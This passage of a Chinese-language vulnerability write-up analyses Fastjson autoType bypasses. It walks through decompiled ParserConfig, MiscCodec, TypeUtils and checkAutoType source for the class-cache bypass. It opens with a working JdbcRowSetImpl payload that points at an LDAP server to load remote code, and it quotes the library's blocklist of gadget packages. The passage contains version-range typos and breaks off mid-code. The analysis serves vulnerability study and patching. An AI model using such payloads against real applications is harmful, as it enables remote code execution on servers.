<h5 id="PAYLOAD-2"><a href="#PAYLOAD-2" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="PAYLOAD2"><a href="#PAYLOAD2" class="headerlink" title="PAYLOAD2"></a>PAYLOAD2</h4><h5 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport</p>
<p>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32  autoTypeSupport开启或未开启均可利用</p>
<h5 id="利用链分析：-3"><a href="#利用链分析：-3" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>ParserConfig#checkAutoType()方法中若autoTypeSupport为false,则会运行到Class&lt;?&gt; clazz &#x3D; TypeUtils.getClassFromMapping(typeName);若clazz为空则会运行clazz &#x3D; this.deserializers.findClass(typeName);其中deserializers当类初始化时会添加数据，若目标类在ParserConfig类初始化添加类map中，则checkAutoType()方法可return目标类：具体如下</p>
<p><img src="/image/image-20220908155129860.png" srcset="/img/loading.gif" lazyload alt="image-20220908155129860"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">ParserConfig</span><span class="hljs-params">(ASMDeserializerFactory asmFactory, ClassLoader parentClassLoader)</span> &#123;<br>    <span class="hljs-built_in">this</span>.deserializers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IdentityHashMap</span>();<br>    <span class="hljs-built_in">this</span>.asmEnable = !ASMUtils.IS_ANDROID;<br>    <span class="hljs-built_in">this</span>.symbolTable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SymbolTable</span>(<span class="hljs-number">4096</span>);<br>    <span class="hljs-built_in">this</span>.autoTypeSupport = AUTO_SUPPORT;<br>    <span class="hljs-built_in">this</span>.denyList = <span class="hljs-string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span>.split(<span class="hljs-string">&quot;,&quot;</span>);<br>    <span class="hljs-built_in">this</span>.acceptList = AUTO_TYPE_ACCEPT_LIST;<br>    <span class="hljs-keyword">if</span> (asmFactory == <span class="hljs-literal">null</span> &amp;&amp; !ASMUtils.IS_ANDROID) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (parentClassLoader == <span class="hljs-literal">null</span>) &#123;<br>                asmFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ASMDeserializerFactory</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ASMClassLoader</span>());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                asmFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ASMDeserializerFactory</span>(parentClassLoader);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (ExceptionInInitializerError var4) &#123;<br>        &#125; <span class="hljs-keyword">catch</span> (AccessControlException var5) &#123;<br>        &#125; <span class="hljs-keyword">catch</span> (NoClassDefFoundError var6) &#123;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.asmFactory = asmFactory;<br>    <span class="hljs-keyword">if</span> (asmFactory == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.asmEnable = <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//deserializerst添加类</span><br>    <span class="hljs-built_in">this</span>.deserializers.put(SimpleDateFormat.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Timestamp.class, SqlDateDeserializer.instance_timestamp);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Date.class, SqlDateDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Time.class, TimeDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(java.util.Date.class, DateCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Calendar.class, CalendarCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(JSONObject.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(JSONArray.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Map.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(HashMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(LinkedHashMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(TreeMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(ConcurrentMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Collection.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(List.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(ArrayList.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Object.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(String.class, StringCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(StringBuffer.class, StringCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(StringBuilder.class, StringCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Character.TYPE, CharacterCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Character.class, CharacterCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Byte.TYPE, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Byte.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Short.TYPE, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Short.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Integer.TYPE, IntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Integer.class, IntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Long.TYPE, LongCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Long.class, LongCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(BigInteger.class, BigIntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(BigDecimal.class, BigDecimalCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Float.TYPE, FloatCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Float.class, FloatCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Double.TYPE, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Double.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Boolean.TYPE, BooleanCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Boolean.class, BooleanCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Class.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(<span class="hljs-type">char</span>[].class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CharArrayCodec</span>());<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicBoolean.class, BooleanCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicInteger.class, IntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicLong.class, LongCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicReference.class, ReferenceCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(WeakReference.class, ReferenceCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(SoftReference.class, ReferenceCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(UUID.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(TimeZone.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Locale.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Currency.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(InetAddress.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Inet4Address.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Inet6Address.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(InetSocketAddress.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(File.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(URI.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(URL.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Pattern.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Charset.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(JSONPath.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Number.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicLongArray.class, AtomicCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Serializable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Comparable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Closeable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.addItemsToDeny(DENYS);<br>    <span class="hljs-built_in">this</span>.addItemsToAccept(AUTO_TYPE_ACCEPT_LIST);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>代码继续运行，运行到thisObj &#x3D; deserializer.deserialze(this, clazz, fieldName);进入到MiscCodec#deserialze()方法</p>
<p><img src="/image/image-20220909104428239-16626914698001.png" srcset="/img/loading.gif" lazyload alt="image-20220909104428239"></p>
<p>MiscCodec#deserialze()方法，取出JSON串中var值，然后执行TypeUtils.loadClass(),具体如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialze</span><span class="hljs-params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;<br>    <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> parser.lexer;<br>    String className;<br>    <span class="hljs-keyword">if</span> (clazz == InetSocketAddress.class) &#123;<span class="hljs-comment">//判断clazz 是否为InetSocketAddress.class</span><br>		......<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Object objVal;<br>        <span class="hljs-keyword">if</span> (parser.resolveStatus == <span class="hljs-number">2</span>) &#123;<br>            parser.resolveStatus = <span class="hljs-number">0</span>;<br>            parser.accept(<span class="hljs-number">16</span>);<br>            <span class="hljs-keyword">if</span> (lexer.token() != <span class="hljs-number">4</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;syntax error&quot;</span>);<br>            &#125;<br>			<span class="hljs-comment">//判断val值，若不为则抛出异常</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;syntax error&quot;</span>);<br>            &#125;<br><br>            lexer.nextToken();<br>            parser.accept(<span class="hljs-number">17</span>);<br>            objVal = parser.parse();<br>            parser.accept(<span class="hljs-number">13</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            objVal = parser.parse();<br>        &#125;<br><br>        String strVal;<br>        <span class="hljs-keyword">if</span> (objVal == <span class="hljs-literal">null</span>) &#123;<br>            strVal = <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(objVal <span class="hljs-keyword">instanceof</span> String)) &#123;<br>                <span class="hljs-keyword">if</span> (objVal <span class="hljs-keyword">instanceof</span> JSONObject &amp;&amp; clazz == Map.Entry.class) &#123;<br>                    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> (JSONObject)objVal;<br>                    <span class="hljs-keyword">return</span> jsonObject.entrySet().iterator().next();<br>                &#125;<br><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;expect string&quot;</span>);<br>            &#125;<br><br>            strVal = (String)objVal;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (strVal != <span class="hljs-literal">null</span> &amp;&amp; strVal.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (clazz == UUID.class) &#123;<br>                <span class="hljs-keyword">return</span> UUID.fromString(strVal);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == URI.class) &#123;<br>                <span class="hljs-keyword">return</span> URI.create(strVal);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == URL.class) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(strVal);<br>                &#125; <span class="hljs-keyword">catch</span> (MalformedURLException var9) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;create url error&quot;</span>, var9);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Pattern.class) &#123;<br>                <span class="hljs-keyword">return</span> Pattern.compile(strVal);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Locale.class) &#123;<br>                String[] items = strVal.split(<span class="hljs-string">&quot;_&quot;</span>);<br>                <span class="hljs-keyword">if</span> (items.length == <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(items[<span class="hljs-number">0</span>]);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> items.length == <span class="hljs-number">2</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(items[<span class="hljs-number">0</span>], items[<span class="hljs-number">1</span>]) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(items[<span class="hljs-number">0</span>], items[<span class="hljs-number">1</span>], items[<span class="hljs-number">2</span>]);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == SimpleDateFormat.class) &#123;<br>                <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">dateFormat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(strVal, lexer.getLocale());<br>                dateFormat.setTimeZone(lexer.getTimeZone());<br>                <span class="hljs-keyword">return</span> dateFormat;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) &#123;<br>                <span class="hljs-keyword">if</span> (clazz == File.class) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(strVal);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == TimeZone.class) &#123;<br>                    <span class="hljs-keyword">return</span> TimeZone.getTimeZone(strVal);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (clazz <span class="hljs-keyword">instanceof</span> ParameterizedType) &#123;<br>                        <span class="hljs-type">ParameterizedType</span> <span class="hljs-variable">parmeterizedType</span> <span class="hljs-operator">=</span> (ParameterizedType)clazz;<br>                        clazz = parmeterizedType.getRawType();<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz == Class.class) &#123; <span class="hljs-comment">//当clazz == Class.class，调用TypeUtils.loadClass(),此时strVal为val对应值</span><br>                        <span class="hljs-keyword">return</span> TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Charset.class) &#123;<br>                        <span class="hljs-keyword">return</span> Charset.forName(strVal);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Currency.class) &#123;<br>                        <span class="hljs-keyword">return</span> Currency.getInstance(strVal);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == JSONPath.class) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONPath</span>(strVal);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>							.........<br></code></pre></td></tr></table></figure>

<p>进入到TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())，会对传过来的类名字符串在mappings找对应的缓存类对象，如果没有就加载对象，并添加到 mappings 缓存起来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;<br>    <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span> &amp;&amp; className.length() != <span class="hljs-number">0</span>) &#123;<br>        Class&lt;?&gt; clazz = (Class)mappings.get(className);<span class="hljs-comment">//从map中获取classname</span><br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<span class="hljs-comment">//判断classname是否[开头</span><br>            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>            <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<span class="hljs-comment">//判断classname是否L开头</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">newClassName</span> <span class="hljs-operator">=</span> className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<span class="hljs-comment">//去除classname中开头的L</span><br>            <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<span class="hljs-comment">//重新调用loadClass()</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (classLoader != <span class="hljs-literal">null</span>) &#123;<br>                    clazz = classLoader.loadClass(className);<span class="hljs-comment">//加载类</span><br>                    mappings.put(className, clazz);<span class="hljs-comment">//将类添加到map中</span><br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var6) &#123;<br>                var6.printStackTrace();<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">contextClassLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<span class="hljs-comment">//获取ClassLoader</span><br>                <span class="hljs-keyword">if</span> (contextClassLoader != <span class="hljs-literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;<br>                    clazz = contextClassLoader.loadClass(className);<span class="hljs-comment">//加载类</span><br>                    mappings.put(className, clazz);<span class="hljs-comment">//将类添加到map中</span><br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var5) &#123;<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                clazz = Class.forName(className);<br>                mappings.put(className, clazz);<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var4) &#123;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>第一个JSON对象解析完毕，开始解析第二个JSON对象，重新进入checkAutoType()，因解析第一个JSON时已把 JdbcRowSetImpl 对象缓存到map中，故此处可直接获取到目标类。</p>
<p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport,可成功利用</p>
<p><img src="/image/image-20220909151611298-16627077738143.png" srcset="/img/loading.gif" lazyload alt="image-20220909151611298"></p>
<p>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.347 autoTypeSupport开启与否均可成功利用</p>
<p>checkAutoType源码修改，若autoTypeSupport为true,当目标类在黑名单中，需要目标类不在map中才会抛出异常</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &gt;= <span class="hljs-built_in">this</span>.maxTypeNameLength) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span 